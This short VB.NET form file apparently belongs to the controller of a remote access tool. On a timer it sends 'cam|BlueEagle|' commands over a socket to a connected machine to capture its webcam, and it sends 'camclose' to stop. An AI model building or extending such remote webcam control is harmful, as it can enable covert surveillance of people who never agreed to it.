Public Class cam
    Public sock As Integer

    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        Timer1.Start()
        Me.SkyDarkButton2.Enabled = True
        Me.SkyDarkButton1.Enabled = False
    End Sub

    Private Sub SkyDarkButton2_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton2.Click
        Timer1.Stop()
        Main.S.Send(sock, "camclose")
        Me.SkyDarkButton2.Enabled = False
        Me.SkyDarkButton1.Enabled = True
    End Sub

    Private Sub camx_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Main.S.Send(sock, "camclose")
    End Sub



    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        Main.S.Send(sock, "cam" & "|BlueEagle|" & SkyDarkCombo1.SelectedIndex)
    End Sub
End Class